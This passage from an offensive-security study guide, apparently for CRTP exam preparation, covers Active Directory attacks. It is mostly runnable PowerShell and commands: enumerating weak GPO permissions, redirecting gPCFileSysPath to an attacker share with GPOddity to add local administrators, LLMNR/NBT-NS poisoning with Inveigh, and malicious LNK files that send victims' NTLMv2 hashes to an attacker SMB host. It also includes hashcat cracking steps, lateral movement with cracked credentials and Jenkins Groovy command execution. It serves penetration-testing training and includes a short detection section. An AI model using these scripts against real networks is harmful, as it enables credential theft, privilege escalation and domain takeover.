│  └── No access at all?                                           │
│      └── Try default creds: admin/admin, admin/password          │
│          Try password spray with domain credentials              │
│          Check for CVEs (e.g., CVE-2024-23897 - File Read)       │
│                                                                  │
│  POST-EXPLOITATION:                                              │
│  ┌─────────────────────────────────────────────────┐             │
│  │ 1. Dump all stored credentials (secrets, keys)  │             │
│  │ 2. Enumerate connected nodes (agents/slaves)    │             │
│  │ 3. Check for service account tokens             │             │
│  │ 4. Pivot to connected build servers             │             │
│  │ 5. Access source code repositories              │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## GPOddity — GPO Abuse via NTLM Relaying

### What is GPOddity?

[GPOddity](https://github.com/synacktiv/GPOddity) is a tool developed by [Synacktiv](https://synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more) that combines **NTLM relaying** with **Group Policy Object (GPO) manipulation** to achieve privilege escalation in Active Directory environments.

### Understanding GPOs

```
┌──────────────────────────────────────────────────────────────────┐
│                  GROUP POLICY OBJECT (GPO) ANATOMY               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  A GPO consists of TWO parts:                                    │
│                                                                  │
│  ┌───────────────────────────────┐                               │
│  │  GROUP POLICY CONTAINER (GPC) │ ← Stored in LDAP (AD)        │
│  │  ─────────────────────────── │                               │
│  │  • displayName               │                               │
│  │  • gPCFileSysPath  ──────┐  │ ← Points to GPT location      │
│  │  • versionNumber          │  │                               │
│  │  • gPCMachineExtensions   │  │                               │
│  │  • gPCUserExtensions     │  │                               │
│  └───────────────────────────┘  │                               │
│                                  │                               │
│                                  ▼                               │
│  ┌───────────────────────────────────────────────────┐           │
│  │  GROUP POLICY TEMPLATE (GPT)                      │           │
│  │  ─────────────────────────────                    │           │
│  │  Default Path: \\DC\SYSVOL\domain\Policies\{GUID} │           │
│  │                                                    │           │
│  │  Contains actual policy files:                     │           │
│  │  ├── Machine\                                      │           │
│  │  │   ├── Registry.pol                              │           │
│  │  │   ├── Scripts\                                  │           │
│  │  │   └── Preferences\                              │           │
│  │  │       └── ScheduledTasks\                       │           │
│  │  │           └── ScheduledTasks.xml  ← TARGET!     │           │
│  │  ├── User\                                         │           │
│  │  └── GPT.INI                                       │           │
│  └───────────────────────────────────────────────────┘           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### The GPOddity Attack — Step by Step

```
┌──────────────────────────────────────────────────────────────────┐
│                   GPODDITY ATTACK FLOW                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PRECONDITIONS:                                                  │
│  • A user with WriteDACL/WriteProperty on a GPO                  │
│  • LDAP signing & channel binding disabled (AD default)          │
│  • Ability to perform NTLM relay (MitM position)                 │
│                                                                  │
│  ┌──────────────────────────────────────────┐                    │
│  │ STEP 1: Position for NTLM Relay          │                    │
│  │ • Use LLMNR/NBT-NS poisoning             │                    │
│  │ • ARP spoofing                            │                    │
│  │ • DHCPv6 spoofing                         │                    │
│  │ • Coerce authentication (PetitPotam, etc.)│                    │
│  └──────────────────┬───────────────────────┘                    │
│                     │                                            │
│                     ▼                                            │
│  ┌──────────────────────────────────────────┐                    │
│  │ STEP 2: Relay credentials to LDAP        │                    │
│  │ • Relay the WriteDACL user's auth         │                    │
│  │ • Create machine account (ATTACKER$)      │                    │
│  │ • Give ATTACKER$ full control on GPC      │                    │
│  └──────────────────┬───────────────────────┘                    │
│                     │                                            │
│                     ▼                                            │
│  ┌──────────────────────────────────────────┐                    │
│  │ STEP 3: Modify gPCFileSysPath            │ ← KEY INNOVATION   │
│  │ • Change GPC's gPCFileSysPath attribute   │                    │
│  │ • Point to ATTACKER-controlled SMB share  │                    │
│  │   (instead of \\DC\SYSVOL\...)            │                    │
│  └──────────────────┬───────────────────────┘                    │
│                     │                                            │
│                     ▼                                            │
│  ┌──────────────────────────────────────────┐                    │
│  │ STEP 4: Serve malicious GPT              │                    │
│  │ • Clone legitimate GPT files              │                    │
│  │ • Inject immediate scheduled task         │                    │
│  │ • Host modified GPT on attacker SMB share │                    │
│  │ • GPOddity handles NETLOGON auth          │                    │
│  └──────────────────┬───────────────────────┘                    │
│                     │                                            │
│                     ▼                                            │
│  ┌──────────────────────────────────────────┐                    │
│  │ STEP 5: Target applies malicious policy   │                    │
│  │ • Group Policy refresh (every ~90 min)    │                    │
│  │ • OR force: gpupdate /force               │                    │
│  │ • Malicious task executes as SYSTEM        │                    │
│  │ • DOMAIN TAKEOVER if GPO applies to DC!   │                    │
│  └──────────────────────────────────────────┘                    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Why gPCFileSysPath is the Key Innovation

Traditional GPO exploitation tools (like SharpGPOAbuse, pyGPOAbuse) require:
- Full access to **both** the GPC (LDAP) and the GPT (SMB/SYSVOL)
- Complete compromise of the user (knowing their password or hash)

GPOddity's approach only needs:
- Relayed LDAP access to modify the GPC
- **Changes gPCFileSysPath** to point to an attacker-controlled SMB share
- The target machine fetches the malicious template from the attacker instead of SYSVOL

```
┌──────────────────────────────────────────────────────────────────┐
│       TRADITIONAL vs GPODDITY APPROACH                           │
├────────────────────────────┬─────────────────────────────────────┤
│     TRADITIONAL            │          GPODDITY                   │
├────────────────────────────┼─────────────────────────────────────┤
│ Need user password/hash    │ Only need relayed NTLM auth         │
│ Modify SYSVOL files        │ Redirect gPCFileSysPath to          │
│ directly on DC             │ attacker-controlled SMB share        │
│ Need SMB write to SYSVOL   │ No SYSVOL write needed              │
│ Leaves traces in SYSVOL    │ Cleaner — original SYSVOL untouched │
│ Detected by SYSVOL         │ Harder to detect (LDAP attribute    │
│ integrity monitoring       │ change only)                         │
└────────────────────────────┴─────────────────────────────────────┘
```

### GPOddity Exploitation Commands

```powershell
# ============================================================
# STEP 1: ENUMERATION — Find GPOs with weak ACLs
# ============================================================

# Using PowerView to find GPOs where a user has WriteDACL or GenericAll
Import-Module .\PowerView.ps1

# Find all GPOs in the domain
Get-DomainGPO | Select-Object DisplayName, Name, gPCFileSysPath

# Check ACLs on a specific GPO
Get-DomainObjectAcl -SearchBase "CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=com" `
    -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteDacl|WriteProperty|GenericAll|GenericWrite"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights

# Resolve the SID to a username
Convert-SidToName S-1-5-21-XXXXXXXXXX-YYYYYY-ZZZZZZ-1234

# Find which OUs the GPO is linked to
Get-DomainOU -GPLink "{GPO-GUID}" | Select-Object Name, DistinguishedName

# Check if the GPO is linked to Domain Controllers OU (jackpot!)
Get-DomainOU -Identity "Domain Controllers" | Select-Object -ExpandProperty gplink
```

#### Example Enumeration Output

```
PS C:\> Get-DomainGPO | Select-Object DisplayName, Name, gPCFileSysPath

DisplayName                Name                                   gPCFileSysPath
-----------                ----                                   --------------
Default Domain Policy      {31B2F340-016D-11D2-945F-00C04FB984F9} \\corp.com\SYSVOL\corp.com\Policies\{31B2F340-...}
SRV_ANY_HARDENING_POLICY   {6AC1786C-016F-11D2-945F-00C04fB984F9} \\corp.com\SYSVOL\corp.com\Policies\{6AC1786C-...}
Workstation_Security       {A1234567-ABCD-EFGH-IJKL-123456789012} \\corp.com\SYSVOL\corp.com\Policies\{A1234567-...}

PS C:\> Get-DomainObjectAcl -SearchBase "CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=com" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl|WriteProperty|GenericAll" }

ObjectDN               : CN={6AC1786C-...},CN=Policies,CN=System,DC=corp,DC=com
ActiveDirectoryRights   : WriteDacl
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688200-1603
                          → Resolves to: CORP\adove

[+] User 'adove' has WriteDACL on SRV_ANY_HARDENING_POLICY GPO!
[+] This GPO is linked to the Domain Controllers OU → DOMAIN TAKEOVER possible!
```

### Running GPOddity (from Attacker Machine)

```powershell
# ============================================================
# STEP 2: SET UP NTLM RELAY (on attacker Linux machine)
# ============================================================
# Note: ntlmrelayx runs on Linux, but the concept is critical for CRTP

# Start NTLM relay targeting LDAP on the DC
# python3 ntlmrelayx.py -t ldap://DC.corp.com --interactive

# ============================================================
# STEP 3: Through the LDAP shell, create machine account and
# grant it permissions on the GPO
# ============================================================
# In the ntlmrelayx LDAP shell:
# > create_machine_account GPODDITY$ Password123
# > modify_dacl {GPO-GUID} GPODDITY$ Full_Control

# ============================================================
# STEP 4: RUN GPODDITY
# ============================================================
# GPOddity automates steps 3-5 of the attack flow

# python3 gpoddity.py -d corp.com \
#     -u 'GPODDITY$' -p 'Password123' \
#     -gpo-id '{6AC1786C-016F-11D2-945F-00C04fB984F9}' \
#     -command 'net localgroup administrators GPODDITY$ /add' \
#     -dc-ip 192.168.58.100 \
#     -attacker-ip 192.168.58.50

# ============================================================
# STEP 5: VERIFY ON WINDOWS (PowerShell)
# ============================================================

# Force group policy update on the target (or wait ~90 minutes)
gpupdate /force

# Verify the malicious task executed
net localgroup administrators

# Check if the GPO path changed (detection/verification)
Get-DomainGPO -Identity "SRV_ANY_HARDENING_POLICY" | Select-Object gPCFileSysPath

# Should show attacker-controlled path:
# gPCFileSysPath : \\192.168.58.50\SomeShare\{6AC1786C-...}
```

### GPOddity Attack from Windows (PowerShell Perspective)

```powershell
# ============================================================
# If you already have the user's credentials (non-relay scenario):
# ============================================================

# Check current GPO configuration
Get-DomainGPO -Identity "SRV_ANY_HARDENING_POLICY" | Format-List *

# Modify the gPCFileSysPath using PowerView/LDAP
Set-DomainObject -Identity "CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=com" `
    -Set @{gPCFileSysPath="\\ATTACKER_IP\share\Policies\{GPO-GUID}"}

# Increment the version number (required for policy to refresh)
$currentVersion = (Get-DomainGPO -Identity "SRV_ANY_HARDENING_POLICY").versionNumber
$newVersion = [int]$currentVersion + 1
Set-DomainObject -Identity "CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=com" `
    -Set @{versionNumber=$newVersion}

# Verify the change
Get-DomainGPO -Identity "SRV_ANY_HARDENING_POLICY" | Select-Object gPCFileSysPath, versionNumber
```

### Detection and Blue Team Indicators

```
┌──────────────────────────────────────────────────────────────────┐
│              GPODDITY DETECTION INDICATORS                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. LDAP Monitoring:                                             │
│     • gPCFileSysPath changed to non-SYSVOL location              │
│     • Unexpected modifications to GPO LDAP attributes            │
│     • Event ID 5136 (Directory Service Object Modified)          │
│                                                                  │
│  2. Network Monitoring:                                          │
│     • SMB connections to non-DC IP for Group Policy files        │
│     • NETLOGON authentication from unexpected sources            │
│     • GPO template fetched from outside SYSVOL                   │
│                                                                  │
│  3. Mitigations:                                                 │
│     • Enable LDAP Signing (required)                             │
│     • Enable LDAP Channel Binding                                │
│     • Monitor gPCFileSysPath attribute changes                   │
│     • Audit GPO ACLs regularly                                   │
│     • Restrict machine account creation (ms-DS-                  │
│       MachineAccountQuota = 0)                                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Inveigh & Malicious LNK Files — NTLMv2 Hash Capture

### What is Inveigh?

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a **PowerShell-based** (and .NET-based) tool for performing **LLMNR**, **mDNS**, and **NBT-NS** poisoning attacks on Windows. Think of it as the Windows equivalent of Responder.

```
┌──────────────────────────────────────────────────────────────────┐
│            LLMNR/NBT-NS POISONING WITH INVEIGH                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  NORMAL NAME RESOLUTION:                                         │
│  ┌────────┐  "Where is fileserver01?"  ┌──────────┐             │
│  │ Victim │ ─────────────────────────► │ DNS      │ → Not found │
│  │        │ ◄───────────────────────── │ Server   │             │
│  │        │                            └──────────┘             │
│  │        │  Falls back to LLMNR/NBT-NS broadcast               │
│  │        │  "Anyone know fileserver01?"                         │
│  │        │ ══════════════════════════► [BROADCAST]              │
│  └────────┘                                                      │
│                                                                  │
│  POISONED NAME RESOLUTION (with Inveigh):                        │
│  ┌────────┐  "Where is fileserver01?"  ┌──────────┐             │
│  │ Victim │ ─────────────────────────► │ DNS      │ → Not found │
│  │        │ ◄───────────────────────── │ Server   │             │
│  │        │                            └──────────┘             │
│  │        │  Falls back to LLMNR broadcast                       │
│  │        │ ══════════════════════════► [BROADCAST]              │
│  │        │                                                      │
│  │        │  ┌─────────┐                                         │
│  │        │  │ INVEIGH │  "I am fileserver01!"                   │
│  │        │ ◄────────── │ (POISON)│                              │
│  │        │             └─────────┘                              │
│  │        │                                                      │
│  │        │  Victim tries to authenticate to attacker            │
│  │        │  ──────────── NTLMv2 Hash ──────────►               │
│  │        │                                                      │
│  │        │  Attacker captures the hash!                         │
│  └────────┘                                                      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Running Inveigh

```powershell
# ============================================================
# LOADING INVEIGH
# ============================================================

# Method 1: Import the PowerShell module
Import-Module .\Inveigh.psm1

# Method 2: Dot-source the script
. .\Inveigh.ps1

# ============================================================
# BASIC INVEIGH USAGE — Start Poisoning
# ============================================================

# Start with console output and all poisoning modules
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

# ============================================================
# DETAILED INVEIGH OPTIONS
# ============================================================

# Full-featured Inveigh with all options
Invoke-Inveigh `
    -IP 192.168.1.50 `            # Your IP address on the network
    -ConsoleOutput Y `             # Show output in console
    -FileOutput Y `                # Save captured hashes to file
    -FileOutputDirectory C:\Temp ` # Where to save hash files
    -NBNS Y `                      # Enable NBT-NS poisoning
    -mDNS Y `                      # Enable mDNS poisoning  
    -HTTPS Y `                     # Enable HTTPS server
    -Proxy Y `                     # Enable WPAD proxy
    -MachineAccounts N `           # Ignore machine account hashes
    -RunTime 60                    # Run for 60 minutes then stop

# ============================================================
# INVEIGH MANAGEMENT COMMANDS
# ============================================================

# Check captured hashes during the run
Get-Inveigh -NTLMv2

# Get unique NTLMv2 hashes only (no duplicates)
Get-Inveigh -NTLMv2Unique

# Get all captured hashes (NTLMv1 + NTLMv2)
Get-Inveigh

# Check Inveigh status
Get-Inveigh -Status

# List cleartext credentials captured
Get-Inveigh -Cleartext

# Stop Inveigh
Stop-Inveigh

# Clear all captured data
Clear-Inveigh
```

### Inveigh Example Output

```
PS C:\Tools> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y

[*] Inveigh 1.506 started at 2026-04-08T14:00:00
[+] Listening IP Address = 192.168.1.50
[+] LLMNR Spoofer = Enabled
[+] mDNS Spoofer = Enabled
[+] NBNS Spoofer = Enabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Enabled
[+] Machine Account Capture = Disabled
[+] Real Time Console Output = Enabled
[+] Real Time File Output = Enabled

[+] [2026-04-08T14:01:23] LLMNR request for fileserver01 received from 192.168.1.100
[+] [2026-04-08T14:01:23] LLMNR response sent to 192.168.1.100 for fileserver01

[+] [2026-04-08T14:01:23] SMB NTLMv2 capture for CORP\jsmith from 192.168.1.100
[+] NTLMv2 Hash: jsmith::CORP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:
    0101000000000000C0653150DE09D201...

[+] [2026-04-08T14:03:45] LLMNR request for printserver received from 192.168.1.105
[+] [2026-04-08T14:03:45] LLMNR response sent to 192.168.1.105 for printserver

[+] [2026-04-08T14:03:45] HTTP NTLMv2 capture for CORP\admin_sarah from 192.168.1.105
[+] NTLMv2 Hash: admin_sarah::CORP:AABB001122334455:F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4:
    0101000000000000...
```

### Creating Malicious LNK Files for Hash Capture

This technique creates a `.lnk` (shortcut) file with a **poisoned icon path** pointing to an attacker-controlled SMB share. When any user browses to the folder containing the LNK file, Windows automatically tries to load the icon — triggering an authentication attempt.

```
┌──────────────────────────────────────────────────────────────────┐
│               MALICIOUS LNK FILE ATTACK FLOW                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  STEP 1: Create LNK with poisoned icon path                     │
│  ┌──────────────────────────────────────────┐                    │
│  │ Icon: \\ATTACKER_IP\share\icon.ico       │                    │
│  │ (Points to attacker-controlled SMB)       │                    │
│  └──────────────────────┬───────────────────┘                    │
│                         │                                        │
│  STEP 2: Drop LNK in high-traffic file share                    │
│  ┌──────────────────────────────────────────┐                    │
│  │ \\FileServer\Public\@ImportantDoc.lnk    │                    │
│  │ (@ prefix makes it sort to the top!)      │                    │
│  └──────────────────────┬───────────────────┘                    │
│                         │                                        │
│  STEP 3: Start Inveigh/listener on attacker machine              │
│  ┌──────────────────────────────────────────┐                    │
│  │ Inveigh listening on 192.168.1.50        │                    │
│  │ Waiting for SMB authentication...         │                    │
│  └──────────────────────┬───────────────────┘                    │
│                         │                                        │
│  STEP 4: Victim browses to the file share                        │
│  ┌──────────────────────────────────────────┐                    │
│  │ User opens \\FileServer\Public\          │                    │
│  │ Windows auto-loads icon from             │                    │
│  │ \\ATTACKER_IP\share\ → sends NTLMv2!    │                    │
│  └──────────────────────┬───────────────────┘                    │
│                         │                                        │
│  STEP 5: Attacker captures NTLMv2 hash                           │
│  ┌──────────────────────────────────────────┐                    │
│  │ Hash captured! Crack offline or relay.    │                    │
│  └──────────────────────────────────────────┘                    │
│                                                                  │
│  ★ The victim doesn't need to CLICK the file!                   │
│  ★ Just BROWSING to the folder triggers the attack!             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Creating the Malicious LNK File

```powershell
# ============================================================
# METHOD 1: PowerShell — Create Malicious LNK (Detailed)
# ============================================================

# Define attacker IP and target share
$attackerIP = "192.168.1.50"
$targetShare = "\\FileServer\Public"

# Create the WScript.Shell COM object
$wsh = New-Object -ComObject WScript.Shell

# Create the shortcut
$lnk = $wsh.CreateShortcut("C:\Temp\@ImportantDoc.lnk")

# Set the target (can be anything — users rarely click LNK files)
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"

# Set window style to minimized (7) so nothing visible pops up
$lnk.WindowStyle = 7

# THE KEY PART: Set the icon path to the attacker's SMB share
# When Windows renders this shortcut's icon, it will reach out
# to the attacker's SMB server, sending NTLMv2 credentials!
$lnk.IconLocation = "\\$attackerIP\share\icon.ico"

# Save the LNK file
$lnk.Save()

# Copy to the target share (where other users will browse)
Copy-Item "C:\Temp\@ImportantDoc.lnk" "$targetShare\@ImportantDoc.lnk" -Force

Write-Output "[+] Malicious LNK dropped at $targetShare\@ImportantDoc.lnk"
Write-Output "[+] Icon path: \\$attackerIP\share\icon.ico"
Write-Output "[+] Start Inveigh and wait for hashes!"

# ============================================================
# METHOD 2: Compact One-Liner
# ============================================================

$w = New-Object -ComObject WScript.Shell; $s = $w.CreateShortcut("\\FileServer\Public\@Report.lnk"); $s.TargetPath = "C:\Windows\System32\cmd.exe"; $s.IconLocation = "\\192.168.1.50\share\icon.ico"; $s.WindowStyle = 7; $s.Save()

# ============================================================
# METHOD 3: Create Multiple LNK Files for Different Shares
# ============================================================

$attackerIP = "192.168.1.50"
$shares = @(
    "\\FileServer\Public",
    "\\FileServer\HR",
    "\\FileServer\Finance",
    "\\FileServer\IT"
)

foreach ($share in $shares) {
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut("$share\@Quarterly_Report.lnk")
        $lnk.TargetPath = "C:\Windows\System32\cmd.exe"
        $lnk.WindowStyle = 7
        $lnk.IconLocation = "\\$attackerIP\share\icon.ico"
        $lnk.Save()
        Write-Output "[+] LNK dropped: $share\@Quarterly_Report.lnk"
    } catch {
        Write-Output "[-] Failed to write to: $share — Access Denied"
    }
}
```

### Complete Attack: Inveigh + LNK File Combo

```powershell
# ============================================================
# FULL ATTACK SEQUENCE — Run these in order
# ============================================================

# PHASE 1: Start Inveigh listener (on attacker Windows machine)
Import-Module .\Inveigh.psm1
Invoke-Inveigh `
    -IP 192.168.1.50 `
    -ConsoleOutput Y `
    -FileOutput Y `
    -FileOutputDirectory C:\Loot `
    -NBNS Y `
    -mDNS Y `
    -HTTPS Y `
    -MachineAccounts N

# PHASE 2: Create and deploy malicious LNK (from compromised machine)
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("\\FileServer\Public\@Budget_2026.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.WindowStyle = 7
$lnk.IconLocation = "\\192.168.1.50\share\icon.ico"
$lnk.Save()
Write-Output "[+] LNK deployed! Waiting for victims..."

# PHASE 3: Monitor captured hashes (back on attacker machine)
# Check periodically:
Get-Inveigh -NTLMv2Unique

# PHASE 4: Crack captured hashes (save to file first)
# Export hashes
Get-Inveigh -NTLMv2Unique | Out-File C:\Loot\captured_hashes.txt

# Transfer to cracking machine and use hashcat:
# hashcat -m 5600 captured_hashes.txt rockyou.txt
# Mode 5600 = NTLMv2

# PHASE 5: Use cracked credentials
# Option A: Lateral movement with cracked password
$cred = New-Object System.Management.Automation.PSCredential(
    "CORP\captured_user",
    (ConvertTo-SecureString "CrackedPassword123" -AsPlainText -Force)
)
Enter-PSSession -ComputerName TARGET_SERVER -Credential $cred

# Option B: If SMB Signing is disabled — relay the hash directly!
# (Using ntlmrelayx on Linux)
```

### Expected Hash Capture Output

```
PS C:\> Get-Inveigh -NTLMv2Unique

===== Unique NTLMv2 Hashes =====

[1] jsmith::CORP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:
    01010000000000008025DBC5783DC0190123456789ABCDEF0000000002000800430041004C00
    4C000100100044004300300031002E004300410046004C002E004C004F00430000000000
    Source: SMB (192.168.1.100 → LNK icon load)
    Time: 2026-04-08 14:05:23

[2] admin_sarah::CORP:AABB001122334455:F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4:
    01010000000000004532CF82893DC019FEDCBA9876543210000000000200080043004100
    4C004C000100100044004300300031002E00430041004C004C002E004C004F00430000000000
    Source: HTTP (192.168.1.105 → LLMNR poison)
    Time: 2026-04-08 14:12:45

[3] svc_backup::CORP:CCDD556677889900:B4A3C2D1E0F9B4A3C2D1E0F9B4A3C2D1:
    0101000000000000A23B8F19923DC019ABCDEF0123456789000000000200080043004100
    4C004C000100100044004300300031002E00430041004C004C002E004C004F00430000000000
    Source: SMB (192.168.1.110 → LNK icon load)
    Time: 2026-04-08 14:18:02

===== Total: 3 unique hashes captured =====
```

### Cracking the Hashes with PowerShell (Prep Work)

```powershell
# ============================================================
# HASH CRACKING PREPARATION (Windows/PowerShell)
# ============================================================

# Export all unique NTLMv2 hashes to a file
Get-Inveigh -NTLMv2Unique | Out-File -FilePath C:\Loot\ntlmv2_hashes.txt -Encoding ASCII

# Display hash count
$hashCount = (Get-Content C:\Loot\ntlmv2_hashes.txt | Where-Object { $_ -match "::" }).Count
Write-Output "[+] Total unique hashes to crack: $hashCount"

# Transfer to cracking rig (or crack locally if GPU available)
# Using hashcat on the cracking machine:
#   hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt --force
#   hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt -r best64.rule
#
# -m 5600    → NTLMv2 hash mode
# -a 0       → Dictionary attack
# -r         → Apply rules for mutations
# --show     → Display cracked passwords after completion

# ============================================================
# CLEANUP — Remove evidence after the engagement
# ============================================================

# Stop Inveigh
Stop-Inveigh

# Remove the malicious LNK file
Remove-Item "\\FileServer\Public\@Budget_2026.lnk" -Force

# Clear Inveigh data from memory
Clear-Inveigh

# Verify cleanup
Write-Output "[+] Cleanup complete. LNK removed, Inveigh stopped."
```

---

## Tool Summary and CRTP Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────┐
│                  CRTP QUICK REFERENCE CARD                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ═══ PRIVILEGE ESCALATION ═══                                    │
│                                                                  │
│  . .\PowerUp.ps1                                                 │
│  Get-ServiceUnquoted -Verbose          # Unquoted paths          │
│  Get-ModifiableServiceFile -Verbose    # Writable binaries       │
│  Get-ModifiableService -Verbose        # Weak DACLs              │
│  Invoke-AllChecks                      # Run everything          │
│                                                                  │
│  . .\PrivescCheck.ps1                                            │
│  Invoke-PrivescCheck -Extended         # Extended checks         │
│                                                                  │
│  .\winPEASx64.exe                      # Full system enum        │
│                                                                  │
│  ═══ JENKINS EXPLOITATION ═══                                    │
│                                                                  │
│  Navigate: http://<jenkins>/script                               │
│  Execute Groovy:                                                 │
│    def sout = new StringBuffer(), serr = new StringBuffer()      │
│    def proc = 'cmd.exe /c <COMMAND>'.execute()                   │
│    proc.consumeProcessOutput(sout, serr)                         │
│    proc.waitForOrKill(1000)                                      │
│    println "out> $sout err> $serr"                               │
│                                                                  │
│  ═══ GPODDITY ═══                                               │
│                                                                  │
│  1. Enumerate: Get-DomainGPO + Get-DomainObjectAcl              │
│  2. Find WriteDACL/GenericAll on GPO                             │
│  3. Relay + modify gPCFileSysPath to attacker SMB                │
│  4. Serve malicious GPT with immediate scheduled task            │
│  5. Wait for gpupdate → SYSTEM shell                             │
│                                                                  │
│  ═══ INVEIGH + LNK ═══                                          │
│                                                                  │
│  Import-Module .\Inveigh.psm1                                    │
│  Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y      │
│                                                                  │
│  Create poisoned LNK:                                            │
│  $w = New-Object -ComObject WScript.Shell                        │
│  $s = $w.CreateShortcut("\\Share\@File.lnk")                    │
│  $s.IconLocation = "\\ATTACKER_IP\s\i.ico"                      │
│  $s.TargetPath = "C:\Windows\System32\cmd.exe"                   │
│  $s.WindowStyle = 7; $s.Save()                                   │
│                                                                  │
│  Get-Inveigh -NTLMv2Unique            # View captured hashes    │
│  hashcat -m 5600 hashes.txt wordlist  # Crack offline            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [PowerUp — PowerSploit Framework](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [PrivescCheck — itm4n](https://github.com/itm4n/PrivescCheck)
- [PEASS-ng / WinPEAS — carlospolop](https://github.com/carlospolop/PEASS-ng)
- [GPOddity — Synacktiv](https://github.com/synacktiv/GPOddity)
- [GPOddity Research Paper — Synacktiv](https://synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [Inveigh — Kevin Robertson](https://github.com/Kevin-Robertson/Inveigh)
- [Jenkins Script Console Documentation](https://www.jenkins.io/doc/book/managing/script-console/)
- [MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1557/001/)
- [Capturing Password Hashes via Malicious LNK Files — Infinite Logins](https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/)
